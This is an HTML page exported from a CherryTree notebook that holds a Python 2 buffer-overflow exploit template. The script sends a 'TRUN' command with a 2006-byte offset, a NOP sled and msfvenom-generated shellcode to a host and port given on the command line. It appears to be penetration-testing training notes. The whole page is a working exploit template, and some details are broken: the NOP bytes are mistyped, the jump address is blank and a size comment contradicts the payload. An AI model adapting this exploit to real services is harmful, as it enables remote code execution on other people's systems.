<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Python script template</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Python script template</h1><br/>import sys, socket, time<br /><br />if len(sys.argv) &lt;= 2:<br />    print "Usage: python " + sys.argv[0] + " [host] [port]"<br />    exit()<br /><br />host = sys.argv[1] <br />port = int(sys.argv[2])<br /><br /># Find JMP/ESP<br />jump = ""<br /><br /># Generate NOP's<br />nop = "x\90" * 8<br /><br /># msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -v payload -f python -b '\x0a\x00\x0d'<br /># size = 220<br />payload =  ""<br />payload += "\xb8\xe5\xe7\x8e\x16\xdb\xca\xd9\x74\x24\xf4\x5b"<br />payload += "\x33\xc9\xb1\x31\x31\x43\x13\x03\x43\x13\x83\xc3"<br />payload += "\xe1\x05\x7b\xea\x01\x4b\x84\x13\xd1\x2c\x0c\xf6"<br />payload += "\xe0\x6c\x6a\x72\x52\x5d\xf8\xd6\x5e\x16\xac\xc2"<br />payload += "\xd5\x5a\x79\xe4\x5e\xd0\x5f\xcb\x5f\x49\xa3\x4a"<br />payload += "\xe3\x90\xf0\xac\xda\x5a\x05\xac\x1b\x86\xe4\xfc"<br />payload += "\xf4\xcc\x5b\x11\x71\x98\x67\x9a\xc9\x0c\xe0\x7f"<br />payload += "\x99\x2f\xc1\xd1\x92\x69\xc1\xd0\x77\x02\x48\xcb"<br />payload += "\x94\x2f\x02\x60\x6e\xdb\x95\xa0\xbf\x24\x39\x8d"<br />payload += "\x70\xd7\x43\xc9\xb6\x08\x36\x23\xc5\xb5\x41\xf0"<br />payload += "\xb4\x61\xc7\xe3\x1e\xe1\x7f\xc8\x9f\x26\x19\x9b"<br />payload += "\x93\x83\x6d\xc3\xb7\x12\xa1\x7f\xc3\x9f\x44\x50"<br />payload += "\x42\xdb\x62\x74\x0f\xbf\x0b\x2d\xf5\x6e\x33\x2d"<br />payload += "\x56\xce\x91\x25\x7a\x1b\xa8\x67\x10\xda\x3e\x12"<br />payload += "\x56\xdc\x40\x1d\xc6\xb5\x71\x96\x89\xc2\x8d\x7d"<br />payload += "\xee\x2d\x6c\x54\x1a\xc6\x29\x3d\xa7\x8b\xc9\xeb"<br />payload += "\xeb\xb5\x49\x1e\x93\x41\x51\x6b\x96\x0e\xd5\x87"<br />payload += "\xea\x1f\xb0\xa7\x59\x1f\x91\xcb\x3c\xb3\x79\x22"<br />payload += "\xdb\x33\x1b\x3a"<br /><br /># Prefix<br />prefix = "A" * 2006<br /><br /># Offset at 2006 while offering 2500 of total buffer space<br /># 2500 - 2006 - 4 - 8 - 351 = 131 left<br />padding = "B" * (2500 - len(prefix) - len(jump) - len(nop) - len(payload))<br /><br /># Concatenate string for sending<br />code = prefix + jump + nop + payload + padding<br /><br />client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />client.connect((host, port))<br />client.send(('TRUN .' + code + '\r\n'))<br />print client.recv(1024)<br />client.send('EXIT\r\n')<br />print client.recv(1024)<br />client.close()<br /></div></body></html>